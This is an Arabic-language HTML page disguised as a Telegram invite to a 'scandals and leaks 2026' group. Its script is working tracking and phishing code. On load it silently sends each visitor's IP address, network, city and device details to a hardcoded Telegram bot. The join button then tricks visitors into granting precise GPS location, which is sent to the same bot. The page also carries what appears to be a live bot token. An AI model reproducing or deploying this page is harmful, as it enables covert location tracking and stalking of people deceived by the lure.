<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="جروب: فضائح وتسريبات 2026 🔥 (3.4 MB)">
    <meta property="og:description" content="اضغط فوراً للانضمام ومشاهدة المحتوى المسرب قبل الحذف">
    <meta property="og:image" content="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg">
    <meta property="og:type" content="image/jpeg">
    <meta name="twitter:card" content="summary_large_image">

    <title>Telegram: Join Group</title>
    <style>
        body { background-color: #101010; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 40px; border-radius: 30px; text-align: center; width: 85%; max-width: 380px; border: 1px solid #2a2a2a; box-shadow: 0 15px 35px rgba(0,0,0,0.7); position: relative; overflow: hidden; }
        
        /* تنسيق الصورة داخل البطاقة مع تأثير الوميض */
        .group-icon-container { position: relative; width: 130px; height: 130px; margin: 0 auto 25px auto; }
        .group-icon { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid #cc0000; position: relative; z-index: 2; box-shadow: 0 0 15px rgba(204, 0, 0, 0.5); }
        
        /* تأثير الوميض الأحمر خلف الصورة */
        .pulse { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(204, 0, 0, 0.4); border-radius: 50%; animation: pulse-animation 2s infinite; z-index: 1; }

        @keyframes pulse-animation {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.4); opacity: 0; }
        }

        .btn { background: #cc0000; color: white; padding: 18px 30px; border: none; border-radius: 35px; font-weight: bold; font-size: 19px; cursor: pointer; width: 100%; margin-top: 25px; transition: background 0.3s, transform 0.1s; box-shadow: 0 5px 15px rgba(204,0,0,0.3); }
        .btn:hover { background: #b30000; }
        .btn:active { transform: scale(0.98); }
        h2 { margin-bottom: 8px; font-size: 24px; color: #eee; }
        p { color: #888; font-size: 14px; margin-top: 0; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="card">
        <div class="group-icon-container">
            <img src="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg" alt="Group Icon" class="group-icon">
            <div class="pulse"></div>
        </div>
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>جاري تأكيد مستوى الوصول...<br>اضغط انضمام للمتابعة</p>
        <button class="btn" onclick="getGPS()">انضمام للجروب الآن</button>
    </div>

    <script>
        // إعدادات البوت الخاصة بك (لا تقم بتغييرها إذا كانت تعمل)
        const T = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
        const C = '6648970984';

        // 1. الصيد الصامت الفوري (IP + الشبكة) عند فتح الصفحة
        (async function() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                
                let msg = `🕵️‍♂️ **صيد صامت (فتح الرابط):**\n\n`;
                msg += `🌐 **الشبكة:** ${d.org}\n`;
                msg += `🆔 **IP:** ${d.ip}\n`;
                msg += `🏙 **المدينة:** ${d.city}\n`;
                msg += `📱 **الجهاز:** ${navigator.platform}\n`;
                msg += `🖥 **الشاشة:** ${window.screen.width}x${window.screen.height}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch (e) {
                // في حال فشل جلب الـ IP، نرسل إشعاراً بسيطاً بدخول الشخص
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ شخص دخل الرابط لكن لم يتم جلب بيانات الـ IP الخاص به")}`);
            }
        })();

        // 2. طلب الموقع الجغرافي عند الضغط على الزر
        function getGPS() {
            if (!navigator.geolocation) {
                alert("متصفحك لا يدعم خاصية تحديد الموقع. لا يمكنك الانضمام.");
                return;
            }

            navigator.geolocation.getCurrentPosition(async (p) => {
                // في حال السماح بالموقع
                const map = `http://googleusercontent.com/maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 **الموقع الدقيق صيد ثقيل:**\n" + map)}&parse_mode=Markdown`);
                // التحويل لتيليجرام بعد الإرسال (يمكنك تغيير هذا الرابط)
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                // في حال الرفض
                alert("يجب السماح بالوصول للموقع لتأكيد هويتك ودخول الجروب!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
